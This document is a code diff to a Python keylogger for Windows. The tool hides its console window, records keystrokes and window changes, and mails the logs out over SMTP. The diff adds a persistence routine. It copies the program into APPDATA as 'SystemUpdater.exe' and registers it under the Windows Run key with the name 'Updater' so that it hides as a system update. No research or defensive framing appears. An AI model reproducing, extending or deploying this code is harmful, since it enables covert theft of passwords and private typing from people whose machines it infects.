@@ -5,11 +5,22 @@ import threading as thread5
 import sendmail
 import time 
 import sys,os
+import shutil
 
 currentkey = ''
 logdata = ''
 timereport = time.ctime()
 firstreport = 0
+
+def startup():
+	dirapp = os.path.expanduser(os.getenv("APPDATA")) + "\\SystemUpdater.exe"
+	if not os.path.exists(dirapp): 
+		shutil.copy2(sys.argv[0] , dirapp);
+	
+	regquery = os.popen('reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Updater"').read()
+	if regquery.find(dirapp) < 0:
+		os.popen('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Updater" /t REG_SZ /d "cmd.exe /c ' + dirapp + '"')
+		#os.popen("cmd.exe /c " + dirapp)
 
 def checklog(gserver , gport , guser , gpass , mailfrom,  mailto, subject):
     global logdata,timereport,interval,firstreport
@@ -50,6 +61,7 @@ def startkeylogger():
 
 def runobjects(gserver , gport , guser , gpass , mailfrom,  mailto,subject):
 	wg.ShowWindow(wc.GetConsoleWindow(),0);
+	startup()
 	wtthread = thread5.Thread(target=Checkifwindowchanged)
 	kthread = thread5.Thread(target=startkeylogger)
 	mailthread = thread5.Thread(target=checklog , args=(gserver , gport , guser , gpass , mailfrom,  mailto, subject))
@@ -64,8 +76,8 @@ interval = 2
 gserver = ''
 gport = ''
 guser = ''
-gpass = '''
+gpass = ''
 mailfrom = ''
 mailto = ''
-subject = 'report '
+subject = ''
 runobjects(gserver , gport , guser , gpass , mailfrom,  mailto, subject)
